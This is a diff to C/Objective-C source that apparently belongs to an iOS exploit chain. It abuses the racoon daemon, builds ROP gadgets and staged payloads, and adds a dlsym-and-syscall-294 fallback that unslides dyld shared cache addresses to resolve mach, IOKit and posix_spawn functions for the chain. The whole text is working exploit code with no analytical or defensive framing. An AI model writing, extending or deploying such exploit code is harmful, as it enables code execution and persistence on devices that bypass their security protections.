@@ -1,3 +1,4 @@
+#include <dlfcn.h>
 #include <fcntl.h>
 #include <stdio.h>
 #include <stdint.h>
@@ -76,15 +77,48 @@ int install(const char *config_path, const char *racoon_path, const char *dyld_c
 	myoffsets->swapprefix_addr = find_swapprefix(kernel_symbols);
 */
 	void* kernel_symbols = NULL;
-	
-	
+
 	offsets_t * lib_offsets = malloc(sizeof(offsets_t));
 	memset(lib_offsets,0,sizeof(offsets_t));
 	offset_struct_t * myoffsets = malloc(sizeof(offset_struct_t));
 	memset(myoffsets,0,sizeof(offset_struct_t));
 	populate_offsets(lib_offsets, myoffsets);
 	
+	// uses dlsym to get an address of a symbol and then return it's unslid value
+	uint64_t (^get_addr_from_name)(offset_struct_t*, char*) = ^(offset_struct_t * offsets, char * name) {
+		uint64_t sym = (uint64_t)dlsym(RTLD_DEFAULT,name);
+		if (sym == 0) {NSLog(@"symbol (%s) not found",name);exit(1);}
+		uint64_t cache_addr = 0;
+#pragma clang diagnostic push
+#pragma clang diagnostic ignored "-Wdeprecated-declarations"
+		syscall(294, &cache_addr); // get the current slid cache address
+#pragma clang diagnostic pop
+		// unslide the ptr returned by dlsym
+		sym += 0x180000000;
+		sym -= cache_addr;
+		return sym;
+	};
+	
+	
 	myoffsets->new_cache_addr = lib_offsets->constant.new_cache_addr;
+	
+	// Untested fallback behavior
+	if (lib_offsets->userland_funcs.IOConnectTrap6 == 0) {
+		lib_offsets->userland_funcs.IOConnectTrap6 = (void*)(get_addr_from_name(myoffsets,"IOConnectTrap6") - 0x180000000 + myoffsets->new_cache_addr);
+		lib_offsets->userland_funcs.mach_ports_lookup = (void*)(get_addr_from_name(myoffsets,"mach_ports_lookup") - 0x180000000 + myoffsets->new_cache_addr);
+		lib_offsets->userland_funcs.mach_task_self = (void*)(get_addr_from_name(myoffsets,"mach_task_self") - 0x180000000 + myoffsets->new_cache_addr);
+		lib_offsets->userland_funcs.mach_port_destroy = (void*)(get_addr_from_name(myoffsets,"mach_port_destroy") - 0x180000000 + myoffsets->new_cache_addr);
+		lib_offsets->userland_funcs.mach_port_deallocate = (void*)(get_addr_from_name(myoffsets,"mach_port_deallocate") - 0x180000000 + myoffsets->new_cache_addr);
+		lib_offsets->userland_funcs.mach_port_allocate = (void*)(get_addr_from_name(myoffsets,"mach_port_allocate") - 0x180000000 + myoffsets->new_cache_addr);
+		lib_offsets->userland_funcs.mach_port_insert_right = (void*)(get_addr_from_name(myoffsets,"mach_port_insert_right") - 0x180000000 + myoffsets->new_cache_addr);
+		lib_offsets->userland_funcs.mach_ports_register = (void*)(get_addr_from_name(myoffsets,"mach_ports_register") - 0x180000000 + myoffsets->new_cache_addr);
+		lib_offsets->userland_funcs.mach_msg = (void*)(get_addr_from_name(myoffsets,"mach_msg") - 0x180000000 + myoffsets->new_cache_addr);
+		lib_offsets->userland_funcs.posix_spawn = (void*)(get_addr_from_name(myoffsets,"posix_spawn") - 0x180000000 + myoffsets->new_cache_addr);
+	}
+	if (lib_offsets->userland_funcs.mach_vm_remap == 0) {
+		lib_offsets->userland_funcs.mach_vm_remap = (void*)(get_addr_from_name(myoffsets,"_mach_vm_remap") - 0x180000000 + myoffsets->new_cache_addr);
+	}
+
 	myoffsets->BEAST_GADGET_LOADER = myoffsets->BEAST_GADGET+4*9;
 	myoffsets->BEAST_GADGET_CALL_ONLY = myoffsets->BEAST_GADGET+4*8;
 	myoffsets->rop_nop = myoffsets->BEAST_GADGET+4*17;
@@ -107,20 +141,6 @@ int install(const char *config_path, const char *racoon_path, const char *dyld_c
     myoffsets->stage3_jumpaddr = myoffsets->stage3_loadaddr + STAGE3_JUMP;
 	myoffsets->stage3_CS_blob = STAGE3_CSBLOB; 
 	myoffsets->stage3_CS_blob_size = STAGE3_CSBLOB_SIZE;
-	
-	/*
-	lib_offsets->userland_funcs.IOConnectTrap6 = (void*)(get_addr_from_name(offsets,"IOConnectTrap6") - 0x180000000 + offsets->new_cache_addr);
-	lib_offsets->userland_funcs.mach_ports_lookup = (void*)(get_addr_from_name(offsets,"mach_ports_lookup") - 0x180000000 + offsets->new_cache_addr);
-	lib_offsets->userland_funcs.mach_task_self = (void*)(get_addr_from_name(offsets,"mach_task_self") - 0x180000000 + offsets->new_cache_addr);
-	lib_offsets->userland_funcs.mach_vm_remap = (void*)(offsets->raw_mach_vm_remap_call - 0x180000000 + offsets->new_cache_addr);
-	lib_offsets->userland_funcs.mach_port_destroy = (void*)(get_addr_from_name(offsets,"mach_port_destroy") - 0x180000000 + offsets->new_cache_addr);
-	lib_offsets->userland_funcs.mach_port_deallocate = (void*)(get_addr_from_name(offsets,"mach_port_deallocate") - 0x180000000 + offsets->new_cache_addr);
-	lib_offsets->userland_funcs.mach_port_allocate = (void*)(get_addr_from_name(offsets,"mach_port_allocate") - 0x180000000 + offsets->new_cache_addr);
-	lib_offsets->userland_funcs.mach_port_insert_right = (void*)(get_addr_from_name(offsets,"mach_port_insert_right") - 0x180000000 + offsets->new_cache_addr);
-	lib_offsets->userland_funcs.mach_ports_register = (void*)(get_addr_from_name(offsets,"mach_ports_register") - 0x180000000 + offsets->new_cache_addr);
-	lib_offsets->userland_funcs.mach_msg = (void*)(get_addr_from_name(offsets,"mach_msg") - 0x180000000 + offsets->new_cache_addr);
-	lib_offsets->userland_funcs.posix_spawn = (void*)(get_addr_from_name(offsets,"posix_spawn") - 0x180000000 + offsets->new_cache_addr);
-	*/
 
 	// generate stage 2 before stage 1 cause stage 1 needs to know the size of it
 	stage2(kernel_symbols, myoffsets, lib_offsets, "/private/etc/racoon/");
